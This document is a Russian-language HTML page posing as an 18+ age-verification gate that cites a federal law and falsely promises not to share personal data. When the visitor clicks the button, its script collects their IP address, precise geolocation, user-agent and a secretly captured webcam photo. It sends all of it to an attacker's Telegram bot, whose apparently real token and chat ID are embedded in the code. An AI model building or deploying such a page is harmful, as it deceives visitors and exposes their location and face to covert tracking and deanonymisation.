<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Подтверждение возраста</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
        }
        h1 { color: white; font-size: 28px; margin-bottom: 12px; }
        p { color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.5; }
        .warning-icon { font-size: 64px; margin-bottom: 20px; }
        button {
            background: #5865F2;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #4752C4; transform: scale(0.98); }
        .footer { margin-top: 24px; font-size: 12px; color: rgba(255,255,255,0.4); }
    </style>
</head>
<body>
    <div class="card">
        <div class="warning-icon">🔞</div>
        <h1>Требуется подтверждение возраста</h1>
        <p>Согласно Федеральному закону № 436-ФЗ, для доступа к этому контенту необходимо подтвердить, что вам есть 18 лет.</p>
        <button id="verifyBtn">Мне есть 18 лет →</button>
        <div class="footer">Нажатие кнопки не передаёт личные данные третьим лицам.</div>
    </div>

    <script>
        // !!! СЮДА ВСТАВЬ СВОИ ДАННЫЕ ОТ TELEGRAM !!!
        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";   // Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
        const TELEGRAM_CHAT_ID = "805226689";    // Например: "123456789"

        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ IP ----------
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'не удалось определить'; }
        }

        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ----------
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('не поддерживается');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
                    () => resolve('пользователь запретил')
                );
            });
        }

        // ---------- ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ----------
        async function takePhoto() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve('камера не поддерживается');
                    return;
                }
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(photo);
                        };
                    })
                    .catch(() => resolve('пользователь запретил'));
            });
        }

        // ---------- ОТПРАВКА В TELEGRAM ----------
        async function sendToTelegram(ip, location, photo) {
            const ua = navigator.userAgent;
            const caption = `📸 НОВЫЙ ПЕРЕХОД
🌐 IP: ${ip}
📍 Гео: ${location}
💻 User-Agent: ${ua}
🕒 Время: ${new Date().toLocaleString('ru-RU')}`;

            if (photo && photo.startsWith('data:image')) {
                const blob = await (await fetch(photo)).blob();
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('caption', caption);
                formData.append('photo', blob, 'selfie.jpg');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: caption
                    })
                });
            }
        }

        // ---------- ОСНОВНОЙ ЗАПУСК ----------
        document.getElementById('verifyBtn').onclick = async () => {
            const btn = document.getElementById('verifyBtn');
            btn.innerText = '⏳ Проверка...';
            btn.disabled = true;

            const ip = await getIP();
            const location = await getLocation();
            const photo = await takePhoto();

            await sendToTelegram(ip, location, photo);

            // Редирект после отправки
            setTimeout(() => {
                window.location.href = "https://t.me/telegram";
            }, 1500);
        };
    </script>
</body>
</html>
